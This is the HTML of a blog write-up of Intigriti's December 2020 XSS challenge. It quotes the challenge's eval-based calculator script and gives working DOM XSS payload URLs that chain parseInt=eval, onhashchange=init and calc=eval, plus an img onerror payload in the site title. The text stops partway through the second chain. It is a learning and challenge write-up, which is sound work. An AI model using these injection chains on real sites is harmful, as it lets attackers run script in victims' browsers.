<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>Intigriti&#39;s December XSS Challenge Writeup - &#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;</title><meta name="Description" content="Cyber Insecurity blog"><meta property="og:title" content="Intigriti&#39;s December XSS Challenge Writeup" />
<meta property="og:description" content="This month’s Intigriti’s XSS challenge was interesting as it was the first time I saw it had unintentded solutions as well." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/" /><meta property="og:image" content="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/featured-image.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-12-14T01:00:00+04:00" />
<meta property="article:modified_time" content="2020-12-14T01:00:00+04:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/featured-image.png"/>
<meta name="twitter:title" content="Intigriti&#39;s December XSS Challenge Writeup"/>
<meta name="twitter:description" content="This month’s Intigriti’s XSS challenge was interesting as it was the first time I saw it had unintentded solutions as well."/>
<meta name="application-name" content="/blog.xss.am/">
<meta name="apple-mobile-web-app-title" content="/blog.xss.am/"><meta name="theme-color" content="#161209"><meta name="msapplication-TileColor" content="#161209"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png"><link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-touch-icon.png"><link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="#161209"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.xss.am/2020/12/intigriti-december-xss-challenge/" /><link rel="next" href="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.276e0f03323c1a097f41bcf92a0e23bc16079b9e1aae801b101c8fb90aa496875892c3263fbd90b62de11a4f7df38d3d.css" integrity="sha384-J24PAzI8Ggl/Qbz5Kg4jvBYHm54aroAbEByPuQqklodYksMmP72Qti3hGk998409"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Intigriti's December XSS Challenge Writeup",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.xss.am\/2020\/12\/intigriti-december-xss-challenge\/"
        },"image": [{
                            "@type": "ImageObject",
                            "url": "https:\/\/blog.xss.am\/2020\/12\/intigriti-december-xss-challenge\/featured-image.png",
                            "width":  971 ,
                            "height":  218 
                        }],"genre": "posts","keywords": "challenge, xss, intigriti, eval, unintended","wordcount":  658 ,
        "url": "https:\/\/blog.xss.am\/2020\/12\/intigriti-december-xss-challenge\/","datePublished": "2020-12-14T01:00:00+04:00","dateModified": "2020-12-14T01:00:00+04:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "davwwwx","logo": "https:\/\/blog.xss.am\/images\/Boo.png"},"author": {
                "@type": "Person",
                "name": "Davwwwx"
            },"description": ""
    }
    </script></head>
    <body header-desktop="auto" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="&#34;&gt;&lt;img/src=&#34;/%ff/&#34;/onerror=alert(/blog.xss.am/)&gt;&#34;&lt;"><span class="header-title-pre"><img src=x></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">Intigriti&#39;s December XSS Challenge Writeup</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/about" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Davwwwx</a></span>&nbsp;<span class="post-category">included in <a href="/categories/challenges/"><i class="far fa-folder fa-fw"></i>Challenges</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="14-12-2020">14-12-2020</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;658 words&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2020/12/intigriti-december-xss-challenge/featured-image.png"
        data-srcset="/2020/12/intigriti-december-xss-challenge/featured-image.png, /2020/12/intigriti-december-xss-challenge/featured-image.png 1.5x, /2020/12/intigriti-december-xss-challenge/featured-image.png 2x"
        data-sizes="auto"
        alt="/2020/12/intigriti-december-xss-challenge/featured-image.png"
        title="/2020/12/intigriti-december-xss-challenge/featured-image.png" /></div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#solution-1">Solution 1</a></li>
        <li><a href="#solution-2">Solution 2</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>This month’s Intigriti’s XSS challenge was interesting as it was the first time I saw it had unintentded solutions as well.</p>
<p>Challenge on webarchive <a href="https://web.archive.org/web/20201208103813/https://challenge-1220.intigriti.io/" target="_blank" rel="noopener noreffer">https://web.archive.org/web/20201208103813/https://challenge-1220.intigriti.io/</a>.
Vulnerable script on webarchive <a href="https://web.archive.org/web/20201210000939/https://challenge-1220.intigriti.io/script.js" target="_blank" rel="noopener noreffer">https://web.archive.org/web/20201210000939/https://challenge-1220.intigriti.io/script.js</a>.</p>
<h3 id="solution-1">Solution 1</h3>
<p>Parsing query parameters using custom function (e.g. <code>getQueryVariable</code>, line 3) allows to specify those in URL hash on line 11 (below) <code>window.location.href.substr(...)</code>, as <code>String.prototype.indexOf()</code> is looking for the first occurance of <code>?</code> (question mark):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">init</span><span class="p">(){</span>
  <span class="k">try</span><span class="p">{</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;result&#34;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">calc</span><span class="p">(</span><span class="nx">getQueryVariable</span><span class="p">(</span><span class="s2">&#34;num1&#34;</span><span class="p">),</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="s2">&#34;num2&#34;</span><span class="p">),</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="s2">&#34;operator&#34;</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">catch</span><span class="p">(</span><span class="nx">ex</span><span class="p">){</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ex</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="kd">function</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">searchQueryString</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">vars</span> <span class="o">=</span> <span class="nx">searchQueryString</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">value</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">vars</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">pair</span> <span class="o">=</span> <span class="nx">vars</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">value</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Two of the sources (<code>num1</code> and <code>num2</code>) are passed to <code>setNumber</code> function (line 23) when clicking on a number, which itself then passes it to <code>parseInt</code> (lines 101, 104), also there is no protection against iframing it, so, having such URL <a href="https://challenge-1220.intigriti.io/#?num1=parseInt&amp;operator=%3d&amp;num2=eval" target="_blank" rel="noopener noreffer">https://challenge-1220.intigriti.io/#?num1=parseInt&amp;operator=%3d&amp;num2=eval</a> in an iframe, we can execute <code>parseInt=eval</code> as <code>operation</code> in the context of the vulnerable webpage, because <code>=</code> is whitelisted as an operator:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kr">const</span> <span class="nx">operators</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;=&#34;</span><span class="p">];</span>
<span class="kd">function</span> <span class="nx">calc</span><span class="p">(</span><span class="nx">num1</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">num2</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">operator</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">){</span>
  <span class="nx">operator</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">operator</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">operation</span> <span class="o">=</span> <span class="sb">`</span><span class="si">${</span><span class="nx">num1</span><span class="si">}${</span><span class="nx">operator</span><span class="si">}${</span><span class="nx">num2</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;operation&#34;</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">operation</span><span class="p">;</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">operators</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="nx">operator</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
    <span class="k">throw</span> <span class="s2">&#34;Invalid operator.&#34;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="sr">/^[0-9a-zA-Z-]+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">num1</span><span class="p">))</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="sr">/^[0-9a-zA-Z]+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">num2</span><span class="p">))){</span>
    <span class="k">throw</span> <span class="s2">&#34;No special characters.&#34;</span>
  <span class="p">}</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">operation</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">){</span>
    <span class="k">throw</span> <span class="s2">&#34;Operation too long.&#34;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">operation</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
 <span class="nx">init</span><span class="p">();</span>
 <span class="kd">var</span> <span class="nx">numberBtns</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">&#34;number&#34;</span><span class="p">);</span>
 <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">numberBtns</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
   <span class="nx">numberBtns</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
     <span class="nx">setNumber</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">innerText</span><span class="p">)</span>
   <span class="p">};</span>
 <span class="p">};</span>
 <span class="kd">var</span> <span class="nx">operatorBtns</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">&#34;operator&#34;</span><span class="p">);</span>
 <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">operatorBtns</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
   <span class="nx">operatorBtns</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
     <span class="nx">setOperator</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">innerText</span><span class="p">)</span>
   <span class="p">};</span>
 <span class="p">};</span>

  <span class="kd">var</span> <span class="nx">clearBtn</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">&#34;clear&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
  <span class="nx">clearBtn</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
    <span class="nx">clear</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="kd">function</span> <span class="nx">setNumber</span><span class="p">(</span><span class="nx">number</span><span class="p">){</span>
  <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">num1</span> <span class="o">=</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="s1">&#39;num1&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">num2</span> <span class="o">=</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="s1">&#39;num2&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="mi">0</span><span class="p">;</span>
  <span class="kd">var</span> <span class="nx">operator</span> <span class="o">=</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="s1">&#39;operator&#39;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nx">operator</span> <span class="o">==</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">operator</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">){</span>
    <span class="nx">url</span><span class="p">.</span><span class="nx">searchParams</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;num1&#39;</span><span class="p">,</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">num1</span> <span class="o">+</span> <span class="nx">number</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">operator</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">){</span>
    <span class="nx">url</span><span class="p">.</span><span class="nx">searchParams</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;num2&#39;</span><span class="p">,</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">num2</span> <span class="o">+</span> <span class="nx">number</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">({},</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>
  <span class="nx">init</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Now we can redirect the iframe to a new hash <a href="https://challenge-1220.intigriti.io/#?num1=parseInt&amp;operator=%3d&amp;num2=alert%28document.domain%29//" target="_blank" rel="noopener noreffer">https://challenge-1220.intigriti.io/#?num1=parseInt&amp;operator=%3d&amp;num2=alert(document.domain)//</a> and as, only, the URL hash is changed, no request is going to be sent to the server and if the user hits any number, the following script will be executed <code>alert(document.domain)//&lt;number&gt;</code>.</p>
<p>A similar technique can be leveraged when having <code>calc=eval</code> executed then redirecting to a new hash <a href="https://challenge-1220.intigriti.io/#?num1=alert%28document.domain%29&amp;operator=%3d&amp;num2=eval" target="_blank" rel="noopener noreffer">https://challenge-1220.intigriti.io/#?num1=alert(document.domain)&amp;operator=%3d&amp;num2=eval</a>, where the user has to hit an operator</p>
<p>POCs:</p>
<ul>
<li>for numbers - <a href="https://jsfiddle.net/td6yzm0w/1/" target="_blank" rel="noopener noreffer">https://jsfiddle.net/td6yzm0w/1/</a></li>
<li>for operators - <a href="https://jsfiddle.net/td6yzm0w/" target="_blank" rel="noopener noreffer">https://jsfiddle.net/td6yzm0w/</a></li>
</ul>
<p><figure><a class="lightgallery" href="/2020/12/intigriti-december-xss-challenge/response.png" title="Intigriti tip tweet" data-thumbnail="/2020/12/intigriti-december-xss-challenge/response.png" data-sub-html="<h2>Intigriti tip tweet</h2><p>Intigriti tip tweet</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="response.png"
            data-srcset="/2020/12/intigriti-december-xss-challenge/response.png, response.png 1.5x, /2020/12/intigriti-december-xss-challenge/response.png 2x"
            data-sizes="auto"
            alt="/2020/12/intigriti-december-xss-challenge/response.png" />
    </a><figcaption class="image-caption">Intigriti tip tweet</figcaption>
    </figure></p>
<h3 id="solution-2">Solution 2</h3>
<p>Now the intended one, that leads to DOM XSS (Cross site swagging) with no user interaction.
<figure><a class="lightgallery" href="/2020/12/intigriti-december-xss-challenge/tip.png" title="Intigriti tip tweet" data-thumbnail="/2020/12/intigriti-december-xss-challenge/tip.png" data-sub-html="<h2>Intigriti tip tweet</h2><p>Intigriti tip tweet</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="tip.png"
            data-srcset="/2020/12/intigriti-december-xss-challenge/tip.png, tip.png 1.5x, /2020/12/intigriti-december-xss-challenge/tip.png 2x"
            data-sizes="auto"
            alt="/2020/12/intigriti-december-xss-challenge/tip.png" />
    </a><figcaption class="image-caption">Intigriti tip tweet</figcaption>
    </figure></p>
<p>Very right, because <code>getQueryVariable</code> iterates in a loop and takes the value of the last occurrence of the requested parameter (lines 5-10)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">getQueryVariable</span><span class="p">(</span><span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">searchQueryString</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">vars</span> <span class="o">=</span> <span class="nx">searchQueryString</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">value</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">vars</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">pair</span> <span class="o">=</span> <span class="nx">vars</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="nx">variable</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">value</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Chain:</p>
<ul>
<li><a href="https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3d&amp;num2=init&amp;#d&amp;" target="_blank" rel="noopener noreffer">https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3d&amp;num2=init&amp;#d&amp;</a> - execute <code>onhashchange=init</code></li>
<li><a href="https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3d&amp;num2=init&amp;#d&amp;num1=calc&amp;num2=eval" target="_blank" rel="noopener noreffer">https://challenge-1220.intigriti.io/?num1=onhashchange&amp;operator=%3d&amp;num2=init&amp;#d&amp;num1=calc&amp;num2=eval</a> - changing hash, triggering <code>onhashchange</code> which is <code>init</code> now and executing <code>calc=eval</code></li>
